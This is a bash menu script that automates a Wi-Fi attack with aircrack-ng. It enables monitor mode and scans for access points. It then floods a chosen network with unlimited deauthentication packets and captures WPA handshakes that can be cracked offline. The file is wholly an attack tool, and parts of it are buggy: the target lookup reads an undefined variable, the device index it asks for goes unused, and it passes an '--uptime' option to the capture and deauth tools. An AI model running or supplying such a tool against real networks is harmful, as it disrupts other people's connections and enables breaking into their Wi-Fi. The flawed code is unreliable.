#!/bin/bash

# Default wireless interface
default_wireless_interface="wlan1"

# Declare an associative array to store network information
declare -A networks

# Function to display the main menu
display_menu() {
    echo "Main Menu:"
    echo "1. Select wireless interface"
    echo "2. Scan for networks"
    echo "3. Display scanned networks"
    echo "4. Select a network and capture handshake"
    echo "5. Exit"
}

# Function to select a wireless interface
select_wireless_interface() {
    read -p "Enter the name of your wireless interface (or leave blank to use $default_wireless_interface): " wireless_interface_input
    wireless_interface=${wireless_interface_input:-$default_wireless_interface}
    echo "Wireless interface $wireless_interface has been selected."
}

# Function to scan for networks
scan_networks() {
    # Scan for networks and save the output to a file
    airmon-ng start $wireless_interface
    echo "Wireless interface $wireless_interface is now in monitor mode."
    sleep 1

    airodump-ng --uptime 30 $wireless_interface -w scan_output --output-format csv &> /dev/null

    # Wait for a while to ensure networks are scanned
    sleep 10

    # Parse the output to find the BSSID, ESSID, and Channel of the networks
    while IFS=, read -r bssid first_time last_time channel speed privacy cipher authentication power beacons iv lan_ip id_length essid key; do
        if [[ $bssid != "BSSID" ]]; then
            if [[ ! ${networks[$bssid]+_} ]]; then
                networks[$bssid]="Channel: $channel, ESSID: $essid"
            fi
        fi
    done < scan_output-01.csv
}

# Function to display scanned networks
display_scanned_networks() {
    echo "Scanned Networks:"
    index=1
    for bssid in "${!networks[@]}"; do
        echo "[$index] MAC Address: $bssid, ${networks[$bssid]}"
        ((index++))
    done
}

# Function to select a network and capture handshake
capture_handshake() {

    display_scanned_networks

    # Enter Details
    read -p "Enter the index of the network you want to target: " selected_network_index
    # Extract the BSSID from the selected index
    selected_bssid=$(echo "${!networks[@]}" | awk '{print $'$selected_index'}')
    read -p "Enter the index of device deauth packets to send to: " selected_device_index

    # Perform deauthentication attack on the selected network
    aireplay-ng --uptime 40 --deauth 0 -a $selected_bssid $wireless_interface &

    # Capture the handshake
    airodump-ng --uptime 60 --bssid $selected_bssid -w handshake $wireless_interface

    # Once the handshake is captured, stop the script or return to the main menu
}

# Main loop
while true; do
    display_menu
    read -p "Enter your choice: " choice
    case $choice in
        1)
            select_wireless_interface
            ;;
        2)
            scan_networks
            ;;
        3)
            display_scanned_networks
            ;;
        4)
            capture_handshake
            ;;
        5)
            echo "Exiting..."
            # Stop monitoring mode before exiting
            airmon-ng stop $wireless_interface
            exit
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac
done
